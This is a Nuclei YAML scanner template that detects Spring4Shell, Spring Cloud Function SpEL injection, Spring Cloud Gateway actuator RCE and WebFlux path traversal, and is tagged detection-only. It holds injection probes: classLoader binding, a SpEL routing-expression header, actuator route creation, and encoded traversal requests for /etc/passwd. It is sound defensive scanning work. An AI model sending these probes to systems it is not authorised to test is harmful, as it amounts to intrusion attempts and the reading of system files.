id: spring4shell-and-variants-detection

info:
  name: Spring4Shell & Spring Framework CVE Variants (2022-2025)
  author: achraf-chehboun
  severity: critical
  description: |
    Detects Spring4Shell (CVE-2022-22965) and related Spring Framework RCE variants.
    Tests for classLoader property access via data binding, Spring Cloud Function SpEL
    injection (CVE-2022-22963), Spring Cloud Gateway actuator RCE (CVE-2022-22947),
    and Spring WebFlux path traversal. Uses response content validation to prevent
    false positives from catch-all routes and generic error pages.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2022-22965
    - https://nvd.nist.gov/vuln/detail/CVE-2022-22963
    - https://nvd.nist.gov/vuln/detail/CVE-2022-22947
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-94
  metadata:
    max-request: 8
  tags: spring4shell,cve-2022-22965,cve-2022-22963,cve-2022-22947,rce,spring,detection-only

http:
  # === CVE-2022-22965 (Spring4Shell) ===
  # Three-request differential: baseline, class access, invalid class access
  - raw:
      - |
        GET /?xnlbz=baseline HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html
      - |
        GET /?class.module.classLoader.DefaultAssertionStatus=nuclei HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html
      - |
        GET /?class.module.classLoader.INVALID_PROPERTY_XNLBZ=nuclei HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html

    req-condition: true
    matchers-condition: or
    matchers:
      - type: dsl
        name: spring4shell-class-binding
        dsl:
          - 'status_code_2 == 200 && status_code_3 == 400 && !contains(body_2, "<html")'

      - type: dsl
        name: spring4shell-error-differential
        dsl:
          - 'status_code_2 != status_code_1 && status_code_2 != status_code_3 && (status_code_2 == 200 || status_code_2 == 400)'
          - 'contains(body_2, "classLoader") || contains(body_2, "DefaultAssertionStatus")'
        condition: and

  # Spring4Shell Tomcat-specific classLoader probe
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Accept: text/html

        class.module.classLoader.resources.context.parent.pipeline.first.pattern=nuclei-detection-test

    matchers-condition: and
    matchers:
      - type: dsl
        name: spring4shell-tomcat-binding
        dsl:
          - 'status_code == 200 || (status_code == 400 && !contains(body, "BindException"))'
          - 'contains(body, "classLoader") || contains(body, "pipeline") || contains(body, "resources.context")'
        condition: and

  # === CVE-2022-22963 (Spring Cloud Function SpEL) ===
  # Must verify SpEL actually evaluates, not just accept any non-404
  - raw:
      - |
        POST {{BaseURL}}/functionRouter HTTP/1.1
        Host: {{Hostname}}
        spring.cloud.function.routing-expression: T(java.lang.Math).abs(-71589)
        Content-Type: application/x-www-form-urlencoded
        Accept: */*

        nuclei=test

    matchers-condition: or
    matchers:
      - type: dsl
        name: cve-2022-22963-spel-confirmed
        dsl:
          - 'contains(body, "71589")'

      - type: dsl
        name: cve-2022-22963-spel-error
        dsl:
          - 'status_code == 500 && (contains(body, "SpelEvaluationException") || contains(body, "routing-expression") || contains(body, "spring.cloud.function"))'

  # === CVE-2022-22947 (Spring Cloud Gateway) ===
  # Verify actual gateway routes JSON response
  - method: GET
    path:
      - "{{BaseURL}}/actuator/gateway/routes"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: dsl
        name: cve-2022-22947-gateway-routes
        dsl:
          - 'contains(content_type, "json") && (contains(body, "route_id") || contains(body, "\"predicate\"") || contains(body, "\"filters\"") || contains(body, "\"uri\""))'

  # Gateway route creation check (must return 201 with JSON)
  - raw:
      - |
        POST {{BaseURL}}/actuator/gateway/routes/nuclei-test-{{randstr}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Accept: application/json

        {"id":"nuclei-test-{{randstr}}","predicates":[{"name":"Path","args":{"_genkey_0":"/nuclei-test-{{randstr}}"}}],"filters":[{"name":"AddResponseHeader","args":{"name":"X-Nuclei-Test","value":"detection-only"}}],"uri":"https://example.com","order":0}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 201
      - type: dsl
        name: cve-2022-22947-route-writable
        dsl:
          - 'contains(content_type, "json") || len(body) < 10'

  # === SPRING WEBFLUX PATH TRAVERSAL ===
  - method: GET
    path:
      - "{{BaseURL}}/..%252F..%252F..%252Fetc%252Fpasswd"
      - "{{BaseURL}}/%252e%252e/%252e%252e/etc/passwd"

    matchers:
      - type: regex
        name: spring-webflux-traversal
        regex:
          - 'root:.*:0:0:'
        part: body

  # === SPRING BOOT VERSION FINGERPRINTING ===
  - method: GET
    path:
      - "{{BaseURL}}/actuator/info"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: dsl
        dsl:
          - 'contains(content_type, "json") && (contains(body, "\"build\"") || contains(body, "\"git\"") || contains(body, "\"version\""))'

    extractors:
      - type: regex
        name: spring-boot-version
        group: 1
        regex:
          - '"version"\s*:\s*"([0-9]+\.[0-9]+\.[0-9]+[^"]*)"'
      - type: regex
        name: java-version
        group: 1
        regex:
          - '"java".*?"version"\s*:\s*"([^"]+)"'
